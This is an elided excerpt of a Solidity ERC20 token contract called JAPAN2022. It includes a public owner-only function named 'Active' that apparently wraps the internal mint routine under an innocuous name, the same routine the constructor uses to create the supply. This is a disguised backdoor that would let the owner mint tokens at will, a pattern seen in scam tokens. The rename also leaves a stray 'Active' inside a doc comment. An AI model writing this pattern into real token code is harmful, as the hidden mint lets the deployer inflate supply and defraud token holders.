...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Active(uint256 amount) public onlyOwner {
    Active(msg.sender, amount);
    }
    ...
    function Active(address account, uint256 amount) internal virtual {
     ...
     * {decimals} to ever change, and may work incorrectly if it does. Active
     */
...
contract JAPAN2022 is ERC20 {

    uint tokenTotalSupply = 100000000000; 

    constructor() public ERC20("JAPAN2022" , "JAPAN2022") {
        Active(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}